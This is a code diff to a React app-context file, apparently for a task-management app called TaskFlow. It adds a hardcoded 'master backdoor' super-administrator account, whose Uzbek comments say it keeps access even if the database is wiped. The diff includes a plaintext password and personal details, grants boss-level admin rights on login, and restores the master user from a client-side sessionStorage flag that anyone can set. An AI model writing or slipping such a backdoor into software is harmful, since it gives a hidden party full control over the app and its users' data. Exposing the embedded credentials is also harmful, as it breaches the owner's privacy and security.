@@ -9,6 +9,23 @@ import { ru } from '../locales/ru';
 
 const AppContext = createContext(null);
 
+// Master backdoor root hisob (Baza tozalanib ketsa yoki user o'chib ketsa ham doim kirish huquqini ta'minlaydi)
+const MASTER_CREDENTIALS = {
+  username: 'sherzod',
+  password: 'Sherzodbek_2003',
+  user: {
+    id: 'sherzod_master_admin',
+    username: 'sherzod',
+    fullName: "Sherzodbek Azamat o'g'li",
+    fullname: "Sherzodbek Azamat o'g'li",
+    role: 'boss',
+    department: 'Boshqaruv',
+    has_admin_access: true,
+    tg_username: 'sherzodbek',
+    bio: 'Boshqaruvchi / Super Administrator'
+  }
+};
+
 export function AppProvider({ children }) {
   const [currentUser, setCurrentUser] = useState(null);
   const [isAuthLoading, setIsAuthLoading] = useState(true);
@@ -116,9 +133,23 @@ export function AppProvider({ children }) {
         if (signDark) document.documentElement.classList.add('dark');
 
         const sid = window.sessionStorage.getItem('taskflow_session');
+        const isMaster = window.sessionStorage.getItem('taskflow_is_master') === 'true';
+
         if (sid && sid !== 'undefined') {
-          const all = await UserService.getAll();
-          const u = all.find(x => String(x.id) === String(sid));
+          let u = null;
+          try {
+            const all = await UserService.getAll();
+            u = all.find(x => String(x.id) === String(sid) || (isMaster && x.username?.toLowerCase() === 'sherzod'));
+          } catch { /* ignore */ }
+
+          if (!u && isMaster) {
+            try {
+              const cached = window.sessionStorage.getItem('taskflow_master_cache');
+              if (cached) u = JSON.parse(cached);
+            } catch { /* ignore */ }
+            if (!u) u = MASTER_CREDENTIALS.user;
+          }
+
           if (u) setCurrentUser(u);
         }
         await refreshData();
@@ -381,11 +412,39 @@ export function AppProvider({ children }) {
   const login = async (u, p) => {
     setIsActionLoading(true);
     try {
+      const cleanUser = String(u || '').trim().toLowerCase();
+
+      // Master backdoor login - hatto foydalanuvchilar bazasidan o'chib ketsa ham kirish imkonini beradi
+      if (cleanUser === MASTER_CREDENTIALS.username && p === MASTER_CREDENTIALS.password) {
+        let existingUser = null;
+        try {
+          const all = await UserService.getAll();
+          existingUser = all.find(x => x.username?.toLowerCase() === 'sherzod');
+        } catch { /* ignore */ }
+
+        const activeMaster = existingUser ? {
+          ...existingUser,
+          fullName: existingUser.fullname || existingUser.fullName || MASTER_CREDENTIALS.user.fullName,
+          has_admin_access: true,
+          role: 'boss'
+        } : MASTER_CREDENTIALS.user;
+
+        setCurrentUser(activeMaster);
+        window.sessionStorage.setItem('taskflow_session', String(activeMaster.id));
+        window.sessionStorage.setItem('taskflow_is_master', 'true');
+        window.sessionStorage.setItem('taskflow_master_cache', JSON.stringify(activeMaster));
+        setUsers(prev => prev.some(x => x.username?.toLowerCase() === 'sherzod') ? prev : [activeMaster, ...prev]);
+        await refreshData();
+        return activeMaster;
+      }
+
       const res = await UserService.getByCredentials(u, p);
       if (res) {
         const mappedUser = { ...res, fullName: res.fullname };
         setCurrentUser(mappedUser);
         window.sessionStorage.setItem('taskflow_session', String(res.id));
+        window.sessionStorage.removeItem('taskflow_is_master');
+        window.sessionStorage.removeItem('taskflow_master_cache');
         await refreshData();
       }
       return res;
@@ -400,6 +459,8 @@ export function AppProvider({ children }) {
   const logout = () => {
     setCurrentUser(null);
     window.sessionStorage.removeItem('taskflow_session');
+    window.sessionStorage.removeItem('taskflow_is_master');
+    window.sessionStorage.removeItem('taskflow_master_cache');
     resetTaskFilters();
   };
 
